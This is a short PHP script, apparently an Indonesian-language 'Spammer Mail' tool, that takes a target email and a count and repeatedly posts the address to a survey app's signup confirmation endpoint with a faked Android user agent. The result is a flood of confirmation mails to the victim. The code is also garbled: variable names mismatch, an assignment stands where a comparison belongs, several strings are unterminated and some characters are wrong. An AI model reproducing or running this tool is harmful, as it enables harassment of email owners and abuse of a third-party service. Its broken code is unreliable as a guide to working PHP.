<?php
function gass ($target,$jumlah) {
for ($i=1; $i <= $jumlah; $i++) {
$su = array("email" => "$target", "device_id" => "6bb443543d62ab32");
$gass = json_encode ($su);
$ch = curl_init ();
curl_setopt($ch, CURLOPT_URL, "https://www.surveyon.com/surveyon_api/mobile/v1_1/signup/confirmation_key");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFİELDS, $gas);
curl_setopt($ch, CURLOPT_USERAGENT, " surveyon/2.0.3 (Android: 6.0.1; MODEL:ASUS_X00AD; PRODUCT:ww_Phone; MANUFACTURER:asus;)");
$gas = curl_exec($ch);
curl_close($ch);
$respon = json_decode|$gas);
if ($respon->code = 200) {
echo $i . " .BERHASİL\n";
}else{
echo Si. ".GAGAL\n ;
}
}
}

$banner = "\e[33;1m ====================================
=\e[36;1m__  __      _
|  \/  |_ __| |    ___  ___
| |\/| | '__| |   / _ \/ _ \
| |  | | | _| |__|  __/  __/
|_|  |_|_|(_)_____\___|\___|

[+] Spammer Mail [+]
Author : MrLee
Team : Solo player
Github : https://github.com/MrLee2609/
\e[33;1m======================================\n";
sleep(2);
echo $banner;
sleep(2);
echo "\033[33;1m"" => Masukan Email target : ";
$target = trim(fgets(STDİN));
sleep(1);
echo "\033[33;1m"" => Masukan jumlah : ";
$jumlah = trim(fgets(STDİN));
sleep(1);
echo "\n\nRESULT :\" ;
gass($target, $jumlah);
?>